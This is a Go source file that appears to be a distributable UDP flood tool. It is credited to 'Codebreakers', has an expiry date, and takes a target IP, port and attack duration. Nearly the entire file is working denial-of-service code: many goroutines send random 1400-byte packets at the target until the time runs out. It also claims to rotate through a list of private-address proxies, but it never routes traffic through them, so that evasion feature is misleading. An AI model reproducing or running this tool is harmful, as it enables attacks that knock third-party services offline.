package main

import (
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"sync"
	"syscall"
	"time"
)

// Script owned by Codebreakers

const (
	packetSize    = 1400
	chunkDuration = 280
	expiryDate    = "2025-06-17T23:00:00"
)

var proxies = []string{
	"192.168.1.1:8080",
	"192.168.1.2:8080",
	"192.168.1.3:8080",
	"192.168.1.4:8080",
	"192.168.1.5:8080",
	"192.168.1.6:8080",
	"192.168.1.7:8080",
	"192.168.1.8:8080",
	"192.168.1.9:8080",
	"192.168.1.10:8080",
	"192.168.1.11:8080",
	"192.168.1.12:8080",
	"192.168.1.13:8080",
	"192.168.1.14:8080",
	"192.168.1.15:8080",
	"192.168.1.16:8080",
	"192.168.1.17:8080",
	"192.168.1.18:8080",
	"192.168.1.19:8080",
	"192.168.1.20:8080",
	"192.168.1.21:8080",
	"192.168.1.22:8080",
	"192.168.1.23:8080",
	"192.168.1.24:8080",
	"192.168.1.25:8080",
	"192.168.1.26:8080",
	"192.168.1.27:8080",
	"192.168.1.28:8080",
	"192.168.1.29:8080",
	"192.168.1.30:8080",
	"192.168.1.31:8080",
	"192.168.1.32:8080",
	"192.168.1.33:8080",
	"192.168.1.34:8080",
	"192.168.1.35:8080",
	"192.168.1.36:8080",
	"192.168.1.37:8080",
	"192.168.1.38:8080",
	"192.168.1.39:8080",
	"192.168.1.40:8080",
	"192.168.1.41:8080",
	"192.168.1.42:8080",
	"192.168.1.43:8080",
	"192.168.1.44:8080",
	"192.168.1.45:8080",
	"192.168.1.46:8080",
	"192.168.1.47:8080",
	"192.168.1.48:8080",
	"192.168.1.49:8080",
	"192.168.1.50:8080",
	"192.168.1.51:8080",
	"192.168.1.52:8080",
	"192.168.1.53:8080",
	"192.168.1.54:8080",
	"192.168.1.55:8080",
	"192.168.1.56:8080",
	"192.168.1.57:8080",
	"192.168.1.58:8080",
	"192.168.1.59:8080",
}

func main() {
	printOwnershipAndExpiryDetails()
	checkExpiry()

	if len(os.Args) != 4 {
		fmt.Println("Usage: ./mrin <target_ip> <target_port> <attack_duration>")
		return
	}

	targetIP := os.Args[1]
	targetPort := os.Args[2]
	duration, err := strconv.Atoi(os.Args[3])
	if err != nil || duration <= 0 {
		fmt.Println("Invalid attack duration:", err)
		return
	}
	durationTime := time.Duration(duration) * time.Second

	numThreads := max(1, int(float64(runtime.NumCPU())*2.5))
	packetsPerSecond := 1_000_000_000 / packetSize

	var wg sync.WaitGroup
	done := make(chan struct{})
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-signalChan
		close(done)
	}()

	go countdown(durationTime, done)

	for i := 0; i < numThreads; i++ {
		wg.Add(1)
		go sendUDPPackets(targetIP, targetPort, packetsPerSecond/numThreads, durationTime, &wg, done)
	}

	wg.Wait()
	close(done)
}

func printOwnershipAndExpiryDetails() {
	fmt.Println("Script owned by Codebreakers")
	fmt.Printf("Expiry Date: %s\n", expiryDate)
}

func checkExpiry() {
	currentDate := time.Now()
	expiry, _ := time.Parse("2006-01-02T15:04:05", expiryDate)
	if currentDate.After(expiry) {
		fmt.Println("This script has expired. Please contact the developer for a new version.")
		os.Exit(1)
	}
}

func sendUDPPackets(ip, port string, packetsPerSecond int, duration time.Duration, wg *sync.WaitGroup, done chan struct{}) {
	defer wg.Done()
	packet := generatePacket(packetSize)
	interval := time.Second / time.Duration(packetsPerSecond)
	deadline := time.Now().Add(duration)

	ticker := time.NewTicker(10 * time.Second)
	defer ticker.Stop()

	var conn net.Conn
	var err error

	for time.Now().Before(deadline) {
		select {
		case <-done:
			if conn != nil {
				conn.Close()
			}
			return
		case <-ticker.C:
			if conn != nil {
				conn.Close()
			}
			proxy := getRandomProxy()
			fmt.Printf("Changing IP to proxy: %s\n", proxy)
			conn, err = net.Dial("udp", ip+":"+port)
			if err != nil {
				log.Printf("Error connecting through proxy %s: %v\n", proxy, err)
				time.Sleep(time.Second)
				continue
			}
		default:
			if conn != nil {
				sendPackets(conn, packet, interval, deadline, done)
			}
		}
	}
	if conn != nil {
		conn.Close()
	}
}

func sendPackets(conn net.Conn, packet []byte, interval time.Duration, deadline time.Time, done chan struct{}) {
	for time.Now().Before(deadline) {
		select {
		case <-done:
			return
		default:
			_, err := conn.Write(packet)
			if err != nil {
				log.Printf("Error sending UDP packet: %v\n", err)
				return
			}
			time.Sleep(interval)
		}
	}
}

func getRandomProxy() string {
	return proxies[rand.Intn(len(proxies))]
}

func countdown(duration time.Duration, done chan struct{}) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for remainingTime := duration; remainingTime > 0; remainingTime -= time.Second {
		select {
		case <-ticker.C:
			fmt.Printf("\rTime remaining: %s", remainingTime.String())
		case <-done:
			fmt.Println("\rAttack interrupted.")
			return
		}
	}
	fmt.Println("\rTime remaining: 0s")
}

func isDone(done chan struct{}) bool {
	select {
	case <-done:
		return true
	default:
		return false
	}
}

func generatePacket(size int) []byte {
	packet := make([]byte, size)
	for i := 0; i < size; i++ {
		packet[i] = byte(rand.Intn(256))
	}
	return packet
}

func max(x, y int) int {
	if x > y {
		return x
	}
	return y
}

func cleanup() {
	log.Println("Performing cleanup tasks...")
}
